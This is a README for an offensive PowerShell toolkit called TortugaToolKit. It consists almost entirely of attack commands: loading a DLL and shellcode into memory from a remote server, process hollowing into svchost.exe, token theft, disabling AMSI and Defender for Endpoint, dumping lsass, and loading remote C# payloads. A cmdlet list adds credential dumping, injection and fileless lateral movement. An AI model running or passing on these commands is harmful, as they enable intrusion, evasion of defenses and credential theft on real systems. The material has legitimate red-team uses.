# TortugaToolKit


## Examples

Load it

```powershell
$a=[System.Reflection.Assembly]::Load($(IWR -Uri http://yourserver/TurtleToolKit.dll -UseBasicParsing).Content);
Import-Module -Assembly $a

Untested but should work. maybe.
$test=((IWR -Uri 'http://yourserver/turtletoolkit.dll' -UseBasicParsing).RawContent);
$len=$test.length;$test.SubString($len-($len -198));$a=[System.Reflection.Assembly]::Load($test);
Import-Module -Assembly $a

```

Example of remotely loading and encrypting shellcode, then performing proc hollow with it
```powershell
$code = Invoke-EncryptShellcode -shellcode $(IWR -Uri 'http://ip/shellcode.bin' -usebasicparsing).Content
INVPH -encsh $code.encryptedShellcode -k $code.encryptionKey -ivk $code.initVectorKey -pn 'svchost.exe' -Verbose
```
Example of performing ping sweep then admin check on subnet
```powershell
$s = Invoke-PingSweep -s "172.16.23.0";
foreach($h in $s){Invoke-AdminCheck -t $h}

Invoke-AdminCheck -h $(Invoke-PingSweep -s "172.16.75.0")
```
Example of impersonation via process token then running SharpView (or sharphound) as that domain user
```powershell
Invoke-TokenStealer -procH $false

Get-CurrentIdentity

Invoke-TurtleView -c "Get-DomainComputers";
Invoke-TurtleHound
```
Example of disabling amsi then disabling defender for endpoint and performing lsass process dump
```powershell
Disable-AyEmEsEye -Verbose
Disable-DefenderForEndpoint
Invoke-TurtleDump
Enable-DefenderForEndpint

```
Example of loading and executing a c# assembly
```powershell
Invoke-AssemblyLoader -e $false -l $false -path "http://ip/payload" -name namespace -clss targetclass -run method

```

## Cmdlets

```
Disable-AyEmEsEye
Disable-DefenderForEndpoint
Disable-Etw
Enable-DefenderForEndpoint
Enable-Privileges
Get-ActiveDirectoryComputers
Get-ActiveDirectoryForests
Get-ActiveDirectoryGroupMembership
Get-ActiveDirectoryGroups
Get-ActiveDirectoryUsers
Get-CurrentIdentity
Get-MsSQLQuery
Get-SQLInfo
Get-System
Get-TrustedInstaller
Invoke-AdminCheck
Invoke-AssemblyLoader
Invoke-ClassicInjection
Invoke-FileLessLateralMovement
Invoke-LsaSecretsDmp
Invoke-MsSQLAssembly
Invoke-MsSQLShell
Invoke-PingSweep
Invoke-ProcessHollow
Invoke-ShellcodeEncryption
Invoke-TokenStealer
Invoke-TurtleDump
Invoke-TurtleHound
Invoke-TurtleUp
Invoke-TurtleView
Undo-Impersonation

```
